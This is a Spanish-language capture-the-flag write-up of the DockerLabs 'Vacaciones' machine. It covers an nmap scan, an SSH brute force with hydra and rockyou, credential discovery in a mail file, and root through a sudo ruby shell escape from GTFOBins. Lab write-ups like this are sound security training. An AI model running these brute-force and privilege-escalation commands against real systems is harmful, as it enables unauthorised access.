# 🐧Máquina Vacaciones

![Untitled](%F0%9F%90%A7Ma%CC%81quina%20Vacaciones%2029ff0fbeb23e41d6b1274a3bab9923c5/Untitled.png)

**Índice**

# Requisitos previos.

---

### 💿 Instalar Docker.

Para utilizar las máquinas de DockerLabs, hay que instalar Docker en el sistema operativo.

Agrega más detalles aquí…

```bash
sudo apt install docker.io
```

![instalarDocker.jpeg](%F0%9F%90%A7Ma%CC%81quina%20Vacaciones%2029ff0fbeb23e41d6b1274a3bab9923c5/instalarDocker.jpeg)

### 🖥️ Desplegar máquinas vulnerables.

Al descomprimir el archivo.tar obtenemos dos archivos: 

- auto_deploy.sh
- maquinaVulnerable.tar

```bash
sudo bash auto_deploy.sh maquinaVulnerable.tar
```

![Untitled](%F0%9F%90%A7Ma%CC%81quina%20Vacaciones%2029ff0fbeb23e41d6b1274a3bab9923c5/4ea1c794-cb4f-442d-bdee-49902a27a101.png)

### 🚮 Eliminar máquinas vulnerables.

Al finalizar, eliminamos el laboratorio con la combinación de teclas: “Ctrl + c”

![Untitled](%F0%9F%90%A7Ma%CC%81quina%20Vacaciones%2029ff0fbeb23e41d6b1274a3bab9923c5/326748d7-855e-4464-b984-9c24497538ac.png)

# Reconocimiento

---

### 🕵‍♂️Verifico accesibilidad con el comando ping.

El comando “**ping -c 1**” enviando un solo paquete al host de destino.

```bash
ping -c 1 172.17.0.2
```

![Untitled](%F0%9F%90%A7Ma%CC%81quina%20Vacaciones%2029ff0fbeb23e41d6b1274a3bab9923c5/6d779b3d-db19-48d4-bbfb-f47f47738759.png)

La **ttl = 64** nos indica que se trata de una máquina Linux.

### 🕵‍♂️Escaneo de puertos.

Con la herramienta **nmap realizo un escaneo:**

```bash
sudo nmap -p- --open -sS -sC -sV --min-rate=5000 -n -Pn -vvv 172.17.0.2 -oN scanTrust
```

- -p- ➡️  Busco todos los puertos abiertos dentro de una IP.
- —open ➡️ Escaneo de puertos abiertos.
- -sS ➡️ Escaneo de tipo SYN. Identifica puertos abiertos en un host sin completar la conexión TCP. Realiza un escaneo menos detectable y más rápido.
- -sC ➡️ Conjunto de scripts de reconocimiento para realizar este escaneo dentro de los puertos abiertos.
- -sV ➡️ Dentro de los puertos abiertos, encuentra la versión que esta corriendo.
- —min-rate=5000 ➡️ Velocidad mínima de envió de paquetes durante un escaneo. En este caso se enviarán paquetes a una velocidad no menor de 5000 paquetes por segundo. Se recomienda un —min-rate=2000.
- -n ➡️ evita resolución DNS.
- -Pn ➡️ No realiza ping.
- -vvv ➡️ reporta a medida que obtiene resultados.
- -oN ➡️ guarda el escaneo dentro de un fichero.

![Untitled](%F0%9F%90%A7Ma%CC%81quina%20Vacaciones%2029ff0fbeb23e41d6b1274a3bab9923c5/6c122be4-06ba-4dc7-8943-21f2292b8e41.png)

# Explotación

---

### 🕵🏼‍♂️ Puerto 80

Ingresamos y encuentro una página en blanco. 

![Untitled](%F0%9F%90%A7Ma%CC%81quina%20Vacaciones%2029ff0fbeb23e41d6b1274a3bab9923c5/86c3f06c-a101-4018-a98a-3943d8b498e9.png)

Busco información relevante en el código HTML con la combinación de teclas “ctrl + u”.

![Untitled](%F0%9F%90%A7Ma%CC%81quina%20Vacaciones%2029ff0fbeb23e41d6b1274a3bab9923c5/c8c42fb8-cd22-45e7-b944-42b08144b3a7.png)

### 🕵🏼‍♂️ Puerto 22. Ataque de fuerza bruta.

- Al encontrar el posibles usuarios “juan” y “camilo”, intento realizar un ataque de fuerza bruta al protocolo SSH con la herramienta ***hydra.***
    
    ```bash
    sudo hydra -l camilo -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
    ```
    
    No encontré contraseñas para “juan”, intento con el usuario **camilo**.
    
    ![Untitled](%F0%9F%90%A7Ma%CC%81quina%20Vacaciones%2029ff0fbeb23e41d6b1274a3bab9923c5/e179afcf-2b6c-4b4c-85f1-40554398a727.png)
    

# Intrusión

---

### 🔓Accediendo al sistema.

Al obtener usuario y contraseña, ingreso por el puerto 22, protocolo SSH.

```bash
ssh camilo@172.17.0.2
```

Dentro de la sesión de camilo, hay un directorio dentro de la carpeta var, que se llama mail.  Trato de buscar información ahí teniendo en cuenta el mensaje de Juan.

```python
$ cd var
$ ls
backups  cache  lib  local  lock  log  mail  opt  run  spool  tmp  www
$ cd mail
$ ls
camilo
$ cd camilo
$ ls
correo.txt
$ cat correo.txt

```

Obtengo lo siguiente:

![Untitled](%F0%9F%90%A7Ma%CC%81quina%20Vacaciones%2029ff0fbeb23e41d6b1274a3bab9923c5/582b725e-e77e-47c4-84b4-7e227eef8546.png)

Con la contraseña, ingreso a la sesión de juan. Con el comando ***whoami*** verifico quién soy para ver si tengo acceso o no, como usuario root.

![Untitled](%F0%9F%90%A7Ma%CC%81quina%20Vacaciones%2029ff0fbeb23e41d6b1274a3bab9923c5/be637157-5403-4e7f-8d38-668379f861d0.png)

### 🔓Escalada de privilegios.

Una vez hayamos obtenido acceso remoto al servidor, es necesario proceder con la escalada de privilegios, para poder convertirnos en el usuario root del sistema y así contar con todo tipo de permisos sobre el mismo.

Con el comando ***sudo -l*** voy a comprobar posibles formas de escalar privilegios.

```bash
$ sudo -l
```

![Untitled](%F0%9F%90%A7Ma%CC%81quina%20Vacaciones%2029ff0fbeb23e41d6b1274a3bab9923c5/8841bbef-b945-42e6-a314-35c370b7d858.png)

En [https://gtfobins.github.io/](https://gtfobins.github.io/) puedo ver instrucciones para poder escalar privilegios utilizando binarios. Teniendo en cuenta que el usuario **mario** puede ejecutar el binario ruby. Lo busco en el apartado de **sudo.**

![Untitled](%F0%9F%90%A7Ma%CC%81quina%20Vacaciones%2029ff0fbeb23e41d6b1274a3bab9923c5/81ed07fa-b04d-43c3-bfd8-3bd10ae2e88d.png)

```bash
$ sudo /usr/bin/ruby -e 'exec "/bin/sh"'
```

Al ejecutar este comando ya dejo de ser el usuario **juan** para pasar a ser el usuario **root.**

![Untitled](%F0%9F%90%A7Ma%CC%81quina%20Vacaciones%2029ff0fbeb23e41d6b1274a3bab9923c5/ac95c7a8-bf7f-4ec2-86cd-fb49813b28bf.png)

---